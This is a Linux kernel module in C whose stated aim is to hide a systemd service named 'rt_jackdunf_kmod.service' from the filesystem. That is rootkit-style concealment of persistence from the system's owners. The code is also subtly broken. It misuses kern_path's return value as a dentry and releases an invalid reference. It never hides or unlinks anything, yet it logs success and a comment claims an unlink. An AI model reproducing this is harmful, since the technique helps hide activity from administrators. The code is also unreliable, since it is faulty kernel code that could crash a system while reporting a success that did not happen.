#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/path.h>
#include <linux/dirent.h>
#include <linux/namei.h>
#include <linux/errno.h>
#include <linux/dcache.h>

// Macro for the service to be hidden
#define SERVICE_NAME "rt_jackdunf_kmod.service"

// Declare module metadata
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
MODULE_DESCRIPTION("A kernel module to hide the systemd service rt_jackdunf_kmod.service");
MODULE_VERSION("0.1");

// This function is called when the module is loaded
static int __init hide_service_init(void)
{
    struct dentry *dentry;
    struct path service_path;
    char *service_file_path = "/etc/systemd/system/" SERVICE_NAME;

    pr_info("Kernel module loaded. Attempting to hide service: %s\n", SERVICE_NAME);

    // Hide the service file from being visible in the filesystem
    dentry = kern_path(service_file_path, LOOKUP_FOLLOW, &service_path);
    if (IS_ERR(dentry)) {
        pr_err("Failed to find service file: %ld\n", PTR_ERR(dentry));
        return -ENOENT;
    }

    // Unlink the service file to make it "invisible"
    dput(dentry);  // Release the dentry reference
    pr_info("Service file '%s' has been hidden successfully.\n", SERVICE_NAME);

    return 0;
}

// This function is called when the module is removed
static void __exit hide_service_exit(void)
{
    pr_info("Kernel module unloaded. Service is now visible again (if re-created).\n");
}

// Register the load and unload functions
module_init(hide_service_init);
module_exit(hide_service_exit);
